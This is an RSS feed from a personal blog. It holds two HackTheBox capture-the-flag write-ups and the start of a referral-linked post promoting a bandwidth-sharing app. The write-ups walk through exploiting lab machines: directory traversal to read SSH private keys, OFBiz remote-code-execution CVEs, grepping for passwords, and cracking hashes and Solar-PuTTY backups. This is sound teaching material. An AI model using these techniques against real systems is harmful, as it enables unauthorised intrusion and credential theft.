<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>b0rgch3n&apos;s blog</title>
    <description>The Personal Blog of b0rgch3n | CODE: Zerberus</description>
    <link>https://b0rgch3n.github.io/</link>
    <atom:link href="https://b0rgch3n.github.io/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Wed, 13 Nov 2024 18:46:28 +0800</pubDate>
    <lastBuildDate>Wed, 13 Nov 2024 18:46:28 +0800</lastBuildDate>
    <generator>Jekyll v4.3.2</generator>
    
      <item>
        <title>[WriteUp] HackTheBox - Instant</title>
        <description>&lt;p&gt;&lt;strong&gt;Instant&lt;/strong&gt; is a medium difficulty box on HackTheBox.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Starting as usual with Nmap for initial enumeration and network scanning insights.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-1.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;nmap scan&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;No unexpected results:  &lt;br /&gt;
Nmap scan reveals open ports &lt;strong&gt;22&lt;/strong&gt; and &lt;strong&gt;80&lt;/strong&gt;, which are standard.&lt;/p&gt;

&lt;p&gt;Setting aside SSH, let’s focus on analyzing the web service on port 80.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-2.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The web service appears to be related to an encrypted wallet application.&lt;/p&gt;

&lt;p&gt;Next step: proceed with directory enumeration to uncover further data points.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-3.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;dirsearch scan&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Directory scan results for the web service showed no valuable information.&lt;/p&gt;

&lt;p&gt;We will proceed to subdomain enumeration to check for additional entry points.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-4.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;ffuf scan&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Interestingly, even subdomain enumeration yielded a clean report this time.&lt;/p&gt;

&lt;p&gt;The only potentially useful data on the page is the download link for an APK file.&lt;br /&gt;
Download the APK file, then decode it using apktool to explore its contents.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-5.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;apktool&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;We will scan through the extracted APK contents to identify sensitive information.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-6.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;apk content&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;An interesting file, “&lt;strong&gt;network_security_config.xml&lt;/strong&gt;” was found in the decoded APK directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-7.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;config file: network_security_config.xml&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;This file lists two subdomains.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;mywalletv1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;instant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;htb&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;swagger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ui&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;instant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;htb&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Attempting direct access to the mywalletv1 subdomain returns a 404 error, indicating it’s not accessible.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-8.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The swagger-ui subdomain hosts API documentation, disclosing several sensitive endpoints.&lt;br /&gt;
Most API interfaces, however, require authentication for access.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-9.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page: apidocs&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;foothold&quot;&gt;&lt;strong&gt;Foothold&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;To proceed, let’s register a user account.&lt;/p&gt;

&lt;p&gt;Using the register endpoint, we create an account, noting the PIN must be a 5-digit numerical code.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# Like this:
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b0rgch3n@wearehackerone.com&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;12345&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;12345&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b0rgch3n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-10.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;api: /register&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Registration successful.&lt;/p&gt;

&lt;p&gt;We then log in via the login endpoint, which provides an “Access-Token” for authentication.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-11.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;api: /login&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Authentication token received, and we’re ready for further validation.&lt;/p&gt;

&lt;p&gt;Let’s validate the token by testing its functionality.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-12.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;api: /view/profile&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The token returns user information, indicating it’s active and functional.&lt;br /&gt;
An endpoint “&lt;strong&gt;/api/v1/admin/read/log&lt;/strong&gt;” suggests a potential for arbitrary file reads,&lt;br /&gt;
but admin privileges are required, so we need a strategy to gain admin access.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-13.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;api: /admin/read/log&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;It seems we’ve exhausted useful information from this subdomain.&lt;/p&gt;

&lt;p&gt;Revisiting the source code, we’ll search for any hardcoded sensitive data.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-14.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;review code&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;A new subdomain was identified, also providing API services.&lt;/p&gt;

&lt;p&gt;After trying terms like “pass,” “pwd,” “user,” and “token” without results,&lt;br /&gt;
the search term “&lt;strong&gt;admin&lt;/strong&gt;” led to a promising finding.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-15.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;review code&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;It appears that &lt;strong&gt;com.instantlabs.instant.AdminActivities&lt;/strong&gt; contains admin-related information, including smali code related to admin testing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-16.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;review code&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;It looks like we’ve located the admin authentication credentials.&lt;/p&gt;

&lt;p&gt;We’ll test the admin-specific credentials on relevant API endpoints.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-17.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;api: /admin/list/users&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;We’ve secured admin credentials.&lt;br /&gt;
Next, we’ll explore the arbitrary file-read endpoint for potential escalation.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-18.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;api: /admin/read/log&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Yes, directory traversal allows us to read arbitrary files on the server.&lt;br /&gt;
This can be utilized for privilege escalation by locating sensitive files for login information.&lt;/p&gt;

&lt;p&gt;Two files of particular interest are:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;~/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bash_history&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;~/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ssh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_rsa&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;.bash_history is unfortunately empty, but the id_rsa file is intact.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-19.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;api: /admin/read/log&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;We now possess the &lt;strong&gt;SSH private key&lt;/strong&gt; for user shirohige.&lt;br /&gt;
Copy the SSH key to our system, set permissions to 644, and log in as shirohige via SSH.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-20.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;user shell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;We’ve successfully gained a shell with shirohige’s user privileges.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Continue privilege escalation efforts by investigating source code further.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-21.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;review code&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Attempting password recovery from SQLite is unlikely to be feasible.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-22.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;SQLite database&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;It’s time to stop guessing.  &lt;br /&gt;
Running &lt;strong&gt;Linpeas.sh&lt;/strong&gt; will help gather more privilege escalation information.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-23.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;open ports&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Two local-only ports, 8808 and 8888, are detected.&lt;br /&gt;
Port forwarding reveals they are the same API services identified earlier.&lt;/p&gt;

&lt;p&gt;Let’s move on, SQLite information reappears.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-24.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;sqlite database&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Re-evaluating hash-cracking possibilities for the identified password hashes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-25.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;code about hash&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-26.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;code about hash&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Confirmed password hash format as &lt;strong&gt;PBKDF2-HMAC-SHA256&lt;/strong&gt; with 60,000 iterations.&lt;/p&gt;

&lt;p&gt;After spending significant time without success, I found a key detail.&lt;br /&gt;
The final “$” segment can be encoded in Base64 or hex.&lt;br /&gt;
Python’s Werkzeug uses hex,&lt;br /&gt;
while cracking tools like John and Hashcat require Base64.&lt;/p&gt;

&lt;p&gt;Even so, cracking remains unsuccessful, moving on to assess other clues.&lt;/p&gt;

&lt;p&gt;I found a &lt;strong&gt;sessions-backup.dat&lt;/strong&gt; file under the &lt;strong&gt;/opt&lt;/strong&gt; directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-27.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;backup file&lt;/em&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/opt/backups/Solar-PuTTY/sessions-backup.dat&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This file appears encrypted, referring to available decryption tools: &lt;a href=&quot;https://github.com/ItsWatchMakerr/SolarPuttyCracker&quot;&gt;SolarPuttyCracker&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Due to the tool SolarPuttyCracker is outdated, switching to a more recent decryption utility was necessary: &lt;a href=&quot;https://github.com/VoidSec/SolarPuttyDecrypt&quot;&gt;SolarPuttyDecrypt&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-28.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;SolarPuttyDecrypt&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Decryption successful!  &lt;br /&gt;
The SolarPutty configuration file password is “&lt;strong&gt;estrella&lt;/strong&gt;”.  &lt;br /&gt;
The file reveals root account credentials.&lt;/p&gt;

&lt;p&gt;However, direct SSH login as root is restricted. &lt;br /&gt;
So, We’ll log in as shirohige, and then switch to root.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-11-12-writeup-hackthebox-instant/image-29.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;root shell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Successfully accessed root shell privileges :)&lt;/p&gt;

</description>
        <pubDate>Tue, 12 Nov 2024 05:29:00 +0800</pubDate>
        <link>https://b0rgch3n.github.io/2024/11/12/writeup-hackthebox-instant/</link>
        <guid isPermaLink="true">https://b0rgch3n.github.io/2024/11/12/writeup-hackthebox-instant/</guid>
        
        <category>WriteUp</category>
        
        <category>Hack The Box</category>
        
        
      </item>
    
      <item>
        <title>[WriteUp] HackTheBox - Bizness</title>
        <description>&lt;p&gt;&lt;strong&gt;Bizness&lt;/strong&gt; is a easy difficulty box on HackTheBox.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;To collect port information, we first perform enumeration using &lt;strong&gt;Nmap&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-10-28-writeup-hackthebox-bizness/image-1.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;nmap scan&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The open ports are &lt;strong&gt;22&lt;/strong&gt;, &lt;strong&gt;80&lt;/strong&gt;, &lt;strong&gt;443&lt;/strong&gt;, and &lt;strong&gt;34447&lt;/strong&gt;. &lt;br /&gt;
Focus on checking the web services first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-10-28-writeup-hackthebox-bizness/image-2.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The directory enumeration results show nothing, it appears to be a single-page application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-10-28-writeup-hackthebox-bizness/image-3.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;dirsearch scan&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Upon careful examination of the web page, the footer indicates that the site is built using &lt;strong&gt;OFBiz&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-10-28-writeup-hackthebox-bizness/image-4.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;A quick Google search reveals that OFBiz has numerous vulnerabilities, most of which are located under the ‘&lt;strong&gt;/webtools/control/xmlrpc&lt;/strong&gt;’ path.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-10-28-writeup-hackthebox-bizness/image-5.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;This path contains a login panel, and the footer displays that the framework version is &lt;strong&gt;18.12&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-10-28-writeup-hackthebox-bizness/image-6.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;foothold&quot;&gt;&lt;strong&gt;Foothold&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;A brief Google search makes it clear that exploitable vulnerabilities.&lt;br /&gt;
It is discovered that vulnerabilities &lt;strong&gt;CVE-2023-49070&lt;/strong&gt; and &lt;strong&gt;CVE-2023-51467&lt;/strong&gt; can be exploited to execute commands without authentication.   &lt;a href=&quot;https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz&quot;&gt;Exploit CVE-2023-49070 and CVE-2023-51467 Apache OFBiz &amp;lt; 18.12.10&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Download the exploit script and required jar files, adjust the Java environment to version 11, and execute the exploit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-10-28-writeup-hackthebox-bizness/image-7.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;exploit&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Successfully acquired a user-level shell in no time.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;As per standard practice, use &lt;strong&gt;Linpeas.sh&lt;/strong&gt; to gather information for privilege escalation.&lt;br /&gt;
Highlighted sections are found in the report.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-10-28-writeup-hackthebox-bizness/image-8.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;linpeas&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;However, upon inspection, these paths are all non-writable.&lt;br /&gt;
Next, let’s check for any sensitive information leakage.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f | xargs &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;password|passwd|pwd&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Unfortunately, the information found is overwhelming, and much of it is invalid.&lt;/p&gt;

&lt;p&gt;Google search shows that &lt;strong&gt;derby&lt;/strong&gt;, which is included in the project, is also a database under Apache.&lt;br /&gt;
Relevant data is stored in the .dat files located in the ‘&lt;strong&gt;/opt/ofbiz/runtime/data/derby/ofbiz/seg0/&lt;/strong&gt;’ directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-10-28-writeup-hackthebox-bizness/image-9.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;.dat file&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;We seem to have found a password hash.&lt;br /&gt;
However, the hash storage format used by OFBiz appears to be obscure, making it impossible to crack directly with John.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-10-28-writeup-hackthebox-bizness/image-10.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;john&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Continuing with the Google search, I find that it needs to be cracked using different tools:  &lt;a href=&quot;https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker&quot;&gt;Apache-OFBiz-SHA1-Cracker&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Alright, let’s try to crack it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-10-28-writeup-hackthebox-bizness/image-11.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;Apache-OFBiz-SHA1-Cracker&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Successfully obtained the admin password.&lt;br /&gt;
Upon verification, this is actually the root user’s password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-10-28-writeup-hackthebox-bizness/image-12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Gained root shell access, and that concludes the process.&lt;/p&gt;

&lt;p&gt;This was really straightforward, wasn’t it? :)&lt;/p&gt;
</description>
        <pubDate>Tue, 29 Oct 2024 03:41:00 +0800</pubDate>
        <link>https://b0rgch3n.github.io/2024/10/29/writeup-hackthebox-bizness/</link>
        <guid isPermaLink="true">https://b0rgch3n.github.io/2024/10/29/writeup-hackthebox-bizness/</guid>
        
        <category>WriteUp</category>
        
        <category>Hack The Box</category>
        
        
      </item>
    
      <item>
        <title>How to make a breakfast money with Pawns.app</title>
        <description>&lt;p&gt;Turn Win-Win Way into &lt;strong&gt;Passive Income&lt;/strong&gt;:&lt;br /&gt;
Sharinng your internet traffic with people who work in marketing.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;why-i-wrote-this-article&quot;&gt;&lt;strong&gt;Why I wrote this article?&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;For the past few months, I’ve been exploring ways to generate passive income, even if it’s just enough to cover the cost of breakfast (around $1 in most parts of Asia).&lt;/p&gt;

&lt;p&gt;Recently, I came across an app that allows you to earn extra money simply by sharing your internet traffic.&lt;/p&gt;

&lt;p&gt;Being a naturally cautious person, I tend to avoid uncertain offers that require payment. But I figured, why not give it a shot? If at any point I had to pay, I could just walk away—there’s nothing to lose. So, I decided to see what this app was all about. After all, who wouldn’t love the idea of earning some extra cash effortlessly?&lt;/p&gt;

&lt;p&gt;This is the only app that has actually paid me, so I’m excited to share my experience and the answers I’ve found. Plus, I’m happy to introduce this app to those who might benefit from it.&lt;/p&gt;

&lt;p&gt;Let me share my journey and the answers I found!&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;why-pawnsapp-and-not-others&quot;&gt;&lt;strong&gt;Why Pawns.app and not others?&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;The reason sounds a little bittersweet, because only &lt;a href=&quot;https://pawns.app/?r=1865228&quot;&gt;Pawns.app&lt;/a&gt; actually paid me.&lt;/p&gt;

&lt;p&gt;I tried using other apps (I won’t name them to avoid any issues), and while some users claimed they could successfully cash out, I didn’t receive anything. I suspect it’s because I was frequently on different networks, and my IP kept changing. In the end, my account was blocked.&lt;/p&gt;

&lt;p&gt;There are many apps similar to &lt;a href=&quot;https://pawns.app/?r=1865228&quot;&gt;Pawns.app&lt;/a&gt;, and the majority of their users are involved in marketing. Marketers often need access to different networks around the world to perform their tasks.&lt;/p&gt;

&lt;p&gt;As far as I know, it’s such a simple concept: &lt;strong&gt;share your unused internet and turn it into extra cash.&lt;/strong&gt; It’s a win-win situation, right?&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;the-feasibility-of-earn-a-breakfast-by-pawnsapp&quot;&gt;&lt;strong&gt;The feasibility of earn a breakfast by Pawns.app&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Is earning $1 a day really that far out of reach?&lt;br /&gt;
Let’s break it down.&lt;/p&gt;

&lt;p&gt;The unit price for sharing seems small and generally varies by region. In most areas, the price is around $0.20 per GB.&lt;/p&gt;

&lt;p&gt;So how hard is it to earn $1? Maybe need to share about 5GB of data. Based on my own experience, I earned $7 in one week by sharing roughly 45GB of traffic.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-14-how-to-make-a-breakfast-money-with-pawns-app/image-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This means, on average, you’d need to share about 6.45GB of data to earn $1.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;45 / 7 = 6.4285&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;While the official rates might seem a bit optimistic,&lt;br /&gt;
the key takeaway is that you’re still earning real money.&lt;/p&gt;

&lt;p&gt;Let’s calculate what is the difficulty of 6.5G traffic per day, in order to be more intuitive, the unit of traffic is converted from GB to MB.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;6.5 * 1024 / 24 / 60 = 4.6222&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now, let’s make this clearer: What does sharing 6.5GB of data per day really mean?&lt;br /&gt;
To put it into perspective, that’s less than 5MB per minute.&lt;/p&gt;

&lt;p&gt;5MB is roughly the amount of data used when you visit the homepage of a typical commercial website.&lt;/p&gt;

&lt;p&gt;So, think about it this way: if some marketer visits a business website once per minute through the network you share, you could easily earn $1 a day — enough to cover breakfast!&lt;/p&gt;

&lt;p&gt;Plus, the minimum payout is just $5, which makes reaching your first withdrawal even easier.&lt;/p&gt;

&lt;p&gt;As seen on the &lt;a href=&quot;https://pawns.app/?r=1865228&quot;&gt;Pawns.app&lt;/a&gt; homepage, many users, including myself, have made small but consistent payouts, proving that it works.&lt;/p&gt;

